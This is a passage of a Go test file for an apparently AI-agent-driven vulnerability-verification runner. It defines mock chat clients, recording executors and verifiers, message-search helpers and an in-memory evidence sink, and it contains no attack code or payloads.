	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())

	if findings := runner.ConsolidateAndVerify(context.Background(), session); findings != nil {
		t.Fatalf("findings = %+v", findings)
	}
	if len(client.requests) != 0 || len(verifier.specs) != 0 {
		t.Fatalf("requests/specs = %d/%d", len(client.requests), len(verifier.specs))
	}
}

type scriptedClient struct {
	responses []agent.Response
	errors    []error
	requests  []agent.Request
}

func (client *scriptedClient) Chat(_ context.Context, request agent.Request) (agent.Response, error) {
	copyRequest := request
	copyRequest.Messages = append([]agent.Message(nil), request.Messages...)
	client.requests = append(client.requests, copyRequest)
	if len(client.errors) > 0 {
		err := client.errors[0]
		client.errors = client.errors[1:]
		return agent.Response{}, err
	}
	response := client.responses[0]
	client.responses = client.responses[1:]
	return response, nil
}

type recordingExecutor struct {
	results []exec.ExecutionResult
	inputs  []exec.ExecutionInput
}

type recordingFindingVerifier struct {
	results []verify.VerificationResult
	records []verify.VerificationRecord
	specs   []verify.FindingSpec
}

type recordingSessionVerifier struct {
	loginResults []verify.LoginResult
	loginSpecs   []verify.LoginSpec
}

func (verifier *recordingSessionVerifier) VerifyWithEvidence(_ context.Context, spec verify.FindingSpec) (verify.VerificationResult, verify.VerificationRecord) {
	return verify.VerificationResult{Verdict: verify.VerdictInconclusive, VulnType: spec.VulnType}, verify.VerificationRecord{}
}

func (verifier *recordingSessionVerifier) EstablishSession(_ context.Context, spec verify.LoginSpec) verify.LoginResult {
	verifier.loginSpecs = append(verifier.loginSpecs, spec)
	if len(verifier.loginResults) == 0 {
		return verify.LoginResult{Attempted: true}
	}
	result := verifier.loginResults[0]
	verifier.loginResults = verifier.loginResults[1:]
	return result
}

func (verifier *recordingFindingVerifier) VerifyWithEvidence(_ context.Context, spec verify.FindingSpec) (verify.VerificationResult, verify.VerificationRecord) {
	verifier.specs = append(verifier.specs, spec)
	var record verify.VerificationRecord
	if len(verifier.records) > 0 {
		record = verifier.records[0]
		verifier.records = verifier.records[1:]
	}
	if len(verifier.results) == 0 {
		return verify.VerificationResult{Verdict: verify.VerdictInconclusive, VulnType: spec.VulnType}, record
	}
	result := verifier.results[0]
	verifier.results = verifier.results[1:]
	return result, record
}

func (executor *recordingExecutor) Execute(_ context.Context, input exec.ExecutionInput) []exec.ExecutionResult {
	executor.inputs = append(executor.inputs, input)
	return executor.results
}

func (executor *recordingExecutor) lastBlockCount() int {
	if len(executor.inputs) == 0 {
		return 0
	}
	return len(executor.inputs[len(executor.inputs)-1].Blocks)
}

func defaultRunnerConfig() RunnerConfig {
	return RunnerConfig{MaxTurns: 8, NoCodeLimit: 3, ProviderRetryDelay: time.Millisecond, NetworkBackoff: time.Millisecond, SoftStuckTurns: 3, HardStuckTurns: 5}
}

func containsMessage(messages []agent.Message, role, content string) bool {
	for _, message := range messages {
		if message.Role == role && strings.TrimSpace(message.Content) == strings.TrimSpace(content) {
			return true
		}
	}
	return false
}

func containsMessageFragment(messages []agent.Message, role, fragment string) bool {
	for _, message := range messages {
		if message.Role == role && strings.Contains(message.Content, fragment) {
			return true
		}
	}
	return false
}

func containsTimelineEvent(events []sess.TimelineEvent, kind string) bool {
	for _, event := range events {
		if event.Kind == kind {
			return true
		}
	}
	return false
}

type memoryEvidenceSink struct {
	name  string
	value any
}

func (sink *memoryEvidenceSink) WriteEvidence(name string, value any) (string, error) {
	sink.name = name
	sink.value = value
	return "evidence/" + name + ".json", nil
}

type evidenceSinkFunc func(string, any) (string, error)

func (sink evidenceSinkFunc) WriteEvidence(name string, value any) (string, error) {
	return sink(name, value)
}
